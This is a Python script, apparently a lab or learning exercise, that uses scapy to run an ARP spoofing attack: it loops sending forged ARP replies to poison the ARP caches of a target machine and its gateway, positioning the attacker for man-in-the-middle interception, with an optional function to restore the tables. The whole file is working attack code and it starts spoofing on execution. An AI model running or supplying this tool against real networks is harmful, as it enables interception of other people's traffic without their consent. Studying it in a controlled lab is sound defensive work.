#!usr/bin/env python
from scapy.all import Ether, ARP, srp, sendp
import time
import sys
from media_access import MediaAccessControl
# THIS program requires running the target machine and router (access point) to work properly.
# Tested against Python v2 and v3
# Last update: 2 Nov 2025

TARGET_IP = '192.168.111.111' # Target machine
GATEWAY_IP = '192.168.111.1'  # Gateway IP


def spoof(target_ip, imposter_ip):
    target_machine = MediaAccessControl(ip=target_ip, name='target')
    target_mac = target_machine.find_mac_by_ip()
    # print(packet.show()) # the packet contents
    # print(packet.summary()) # this packet means
    if target_mac is None:
        print('>>> INFO: MAC address not found...')
        return 0
    else:
        arp = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=imposter_ip)
        broadcast = Ether(dst=target_mac)
        packet = broadcast / arp
        sendp(packet, inter=0, verbose=False)
        return 1


def restore(destination_ip, source_ip):
    # Restore the original ARP tab
    dest = MediaAccessControl(ip=destination_ip,name='dest_machine')
    dest_mac = dest.find_mac_by_ip()
    src = MediaAccessControl(ip=source_ip,name='src_machine')
    src_mac = src.find_mac_by_ip()
    if dest_mac is None or src_mac is None:
        print('>>> INFO: MAC addresses not found. Exiting the program..')
        return 0
    else:
        arp = ARP(op=2, pdst=destination_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=src_mac)
        broadcast = Ether(dst=dest_mac)
        packet = broadcast / arp
        # print(packet.show()) # the packet contents
        sendp(packet, inter=0, verbose=False)
        return 1


def execute_spoof():
    # Send repeated ARP msgs to target machines manipulate the gateway and target IP
    count = 0
    flag = True
    print('> Starting ARP spoofing...')
    try:
        while flag:
            # spoof the target (mac as sending machine)
            count += spoof(target_ip=TARGET_IP, imposter_ip=GATEWAY_IP)
            # spoof the gateway (mac as sending machine)
            count += spoof(target_ip=GATEWAY_IP, imposter_ip=TARGET_IP)

            # Dynamic printing
            #print('\rTotal packets sent: ' + str(count)),

            if sys.version_info[0] < 3: # python2
                print('\rTotal packets sent: ' +  str(count)),
            # else: # python3
            #     print('\r Total packets sent: ' + count, end='')

    except KeyboardInterrupt:
        print('>> CTRL + C detected.. Exiting the program...')
    finally:
        print('\nTotal packets sent:',  str(count))


def execute_restore():
    # Send ARP message to reset the gateway and target IP
    count = 0
    print('> Restoring the ARP tables')
    try:
        count += restore(destination_ip=TARGET_IP, source_ip=GATEWAY_IP)
        count += restore(destination_ip=GATEWAY_IP, source_ip=TARGET_IP)

        if sys.version_info[0] < 3: # python2
            print('\rTotal packets sent: ' + str(count)),
        # else: # python3
        #     print('\rTotal packets sent: ' + str(count), end='')

    except KeyboardInterrupt:
        print('>> CTRL + C detected.. Exiting the program...')
    finally:
        print('\nProgram exiting with total packets sent: ' + str(count))


# Call the main func depending on the goal
execute_spoof()
# execute_restore()
